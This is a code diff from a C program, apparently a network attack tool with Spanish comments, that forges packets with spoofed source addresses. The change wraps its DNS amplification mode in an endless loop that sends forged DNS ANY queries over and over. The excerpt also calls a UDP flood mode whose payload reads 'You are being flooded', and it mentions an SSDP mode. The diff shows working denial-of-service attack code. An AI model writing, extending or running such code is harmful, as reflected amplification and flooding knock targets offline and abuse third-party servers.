@@ -26,7 +26,6 @@ int main(int argc, char *argv[]){
     for (j = 1; j < argc; j+=2) {
         if (strcmp(argv[j], "-src") == 0) {
 			if (j + 1 < argc) {
-				printf("%d", strncmp(argv[j+1], "-", 1));
 				if(strncmp(argv[j+1], "-", 1)){
 					ip_addr = argv[j + 1];
 				} else {
@@ -323,30 +322,31 @@ int main(int argc, char *argv[]){
 
 			ssdp(sockfd, &daddr, &saddr);
 		} else if((strcmp(protocolo, "dns_amp") == 0)){
+			while(1){
+				// direccion IP de destino
+				struct sockaddr_in daddr;
+				if(host_addr(&daddr, destino, atoi(puerto)) == 1){
+					return 1;
+				}
 
-			// direccion IP de destino
-			struct sockaddr_in daddr;
-			if(host_addr(&daddr, destino, atoi(puerto)) == 1){
-				return 1;
-			}
+				// direccion IP de origen
+				struct sockaddr_in saddr;
+				if(host_addr(&saddr, addr_src, (rand() % 6000)) == 1){
+					return 1;
+				}
 
-			// direccion IP de origen
-			struct sockaddr_in saddr;
-			if(host_addr(&saddr, addr_src, (rand() % 6000)) == 1){
-				return 1;
-			}
+				// Creamos datagrama udp con el tipo de pregunta ANY
+				char* datagram;
+				int datagram_len;
 
-			// Creamos datagrama udp con el tipo de pregunta ANY
-			char* datagram;
-			int datagram_len;
+				udp_dns(&saddr, &daddr, &datagram, &datagram_len);
 
-			udp_dns(&saddr, &daddr, &datagram, &datagram_len);
-
-			if(sendto (sockfd, datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen("\x03""www\x06""google\x03""com") + 1 + sizeof(dns_question), 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
-			{
-				perror("No se ha podido enviar el datagrama");
-			} else {
-				printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
+				if(sendto (sockfd, datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen("\x03""www\x06""google\x03""com") + 1 + sizeof(dns_question), 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
+				{
+					perror("No se ha podido enviar el datagrama");
+				} else {
+					printf ("Datagrama enviado. Tamaño : %d \n" , ntohs(datagram_len));
+				}
 			}
 		} else if((strcmp(protocolo, "udp_flood") == 0)){
 			udp_flood(sockfd, addr_src, destino, atoi(puerto), "You are being flooded");
